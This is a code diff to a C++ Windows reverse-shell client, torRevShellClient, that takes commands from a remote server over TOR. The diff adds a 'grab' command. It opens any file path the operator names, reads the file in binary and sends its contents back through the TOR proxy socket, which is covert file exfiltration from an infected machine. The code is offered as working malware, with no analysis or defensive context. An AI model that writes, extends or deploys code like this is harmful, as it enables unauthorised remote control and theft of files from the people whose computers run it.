@@ -6,6 +6,9 @@
 #include <Windows.h>
 #include <lmcons.h>
 #include <filesystem>
+#include <vector>
+#include <iterator>
+#include <fstream>
 
 /*
     Contains code for connecting to the server and processing commands
@@ -45,7 +48,7 @@ private:
 public:
 
     /*
-        Starts TOR and sets up some basic info
+        Set up basic shits
     */
     torRevShellClient(std::string torPath, std::string servAddr){
         this->torPath = torPath;
@@ -107,6 +110,9 @@ public:
             else if (cmd.starts_with("cd;")) {
                 this->cd(cmd.substr(3, cmd.size() - 1));
             }
+            else if (cmd.starts_with("grab;")) {
+                this->grab(cmd.substr(5, cmd.size() - 6));
+            }
             else {
                 std::string failResponse = "Received invalid command: " + cmd;
                 torSock.proxySendStr(failResponse);
@@ -146,6 +152,28 @@ public:
         BOOL success = SetCurrentDirectory(pathWStr.c_str());
         std::string response = "cd;" + path + ((success) ? "success;" : "failed;");
         this->torSock.proxySendStr(response);
+    }
+
+    void grab(std::string path) {
+        printf("Attempting to open %s\n", path.c_str());
+        std::ifstream f(path.c_str(), std::ios::binary);
+        if (f.is_open() != true) {
+            printf("Failed to open!\n");
+            this->torSock.proxySendStr("grab;" + path + ";0;ERR");
+        }
+        else {
+            std::string responseStr = "grab;" + path + ";" + std::to_string(std::filesystem::file_size(path)) + ";";
+            std::vector<char> responseBytes;
+            responseBytes.reserve(responseStr.size() + std::filesystem::file_size(path));
+            for (char c : responseStr) {
+                responseBytes.push_back(c);
+            }
+            for (char c; f.get(c);) {
+                responseBytes.push_back(c);
+            }
+            this->torSock.proxySend(responseBytes.data(), responseBytes.size());
+            printf("Grab done\n");
+        }
     }
     
 };
